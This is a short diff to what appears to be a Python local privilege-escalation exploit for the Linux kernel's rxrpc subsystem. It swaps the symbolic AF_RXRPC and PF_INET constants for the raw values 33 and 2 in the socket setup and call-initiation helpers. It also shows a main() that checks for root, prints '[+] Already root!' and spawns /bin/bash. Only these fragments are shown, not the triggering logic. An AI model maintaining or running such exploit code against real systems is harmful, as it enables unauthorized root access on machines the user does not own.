@@ -175,10 +175,10 @@ def add_rxrpc_key(desc, key):
     return add_key(b"rxrpc\x00", desc.encode() + b"\x00", payload, len(payload), -1)
 
 def setup_rxrpc_client(local_port, keyname):
-    fd = socket.socket(socket.AF_RXRPC, socket.SOCK_DGRAM, socket.PF_INET)
+    fd = socket.socket(33, socket.SOCK_DGRAM, 2)
     fd.setsockopt(socket.SOL_RXRPC, RXRPC_SECURITY_KEY, keyname)
     fd.setsockopt(socket.SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, struct.pack("<i", RXRPC_SECURITY_AUTH))
-    srx = struct.pack("<HHHHH", socket.AF_RXRPC, 0, socket.SOCK_DGRAM, 0, 0)
+    srx = struct.pack("<HHHHH", 33, 0, socket.SOCK_DGRAM, 0, 0)
     srx += struct.pack(">I", socket.htonl(0x7F000001))
     srx += struct.pack(">H", socket.htons(local_port))
     srx += b"\x00" * (56 - len(srx))
@@ -187,7 +187,7 @@ def setup_rxrpc_client(local_port, keyname):
 
 def rxrpc_client_initiate_call(cli_fd, srv_port, service_id, user_call_id):
     data = b"PINGPING"
-    srx = struct.pack("<HHHHH", socket.AF_RXRPC, service_id, socket.SOCK_DGRAM, 0, 0)
+    srx = struct.pack("<HHHHH", 33, service_id, socket.SOCK_DGRAM, 0, 0)
     srx += struct.pack(">I", socket.htonl(0x7F000001))
     srx += struct.pack(">H", socket.htons(srv_port))
     srx += b"\x00" * (56 - len(srx))
@@ -306,7 +306,7 @@ def main():
     if os.getuid() == 0:
         print("[+] Already root!"); os.execlp("/bin/bash", "bash")
     try:
-        dummy = socket.socket(socket.AF_RXRPC, socket.SOCK_DGRAM, socket.PF_INET)
+        dummy = socket.socket(33, socket.SOCK_DGRAM, 2)
         dummy.close()
         print("[+] rxrpc module autoloaded")
     except Exception as e:
